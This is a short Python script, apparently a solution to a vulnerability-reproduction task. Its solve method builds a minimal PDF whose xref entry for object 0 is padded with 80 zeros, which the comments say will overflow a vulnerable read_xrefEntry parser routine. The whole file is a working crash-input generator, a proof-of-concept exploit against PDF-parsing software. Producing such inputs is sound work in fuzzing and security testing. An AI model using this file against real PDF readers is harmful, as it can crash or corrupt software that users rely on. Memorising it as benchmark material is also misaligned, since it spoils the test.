import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a minimal PDF with a crafted xref entry to trigger the overflow
        out = bytearray()

        # PDF header
        out += b"%PDF-1.7\n"

        # Object 1: Catalog referencing Pages 2 0 R
        offset_obj1 = len(out)
        out += b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"

        # Object 2: Pages with Count 0
        offset_obj2 = len(out)
        out += b"2 0 obj\n<< /Type /Pages /Count 0 >>\nendobj\n"

        # xref
        xref_offset = len(out)
        out += b"xref\n0 3\n"

        # Overlong zeros for f1 in free entry (object 0)
        long_zeros = b"0" * 80  # sufficiently long to overflow vulnerable read_xrefEntry
        out += long_zeros + b" 65535 f \n"

        # Normal entries for objects 1 and 2 with correct offsets
        out += f"{offset_obj1:010d} 00000 n \n".encode("ascii")
        out += f"{offset_obj2:010d} 00000 n \n".encode("ascii")

        # Trailer and startxref
        out += b"trailer\n<< /Size 3 /Root 1 0 R >>\n"
        out += b"startxref\n"
        out += str(xref_offset).encode("ascii") + b"\n"
        out += b"%%EOF\n"

        return bytes(out)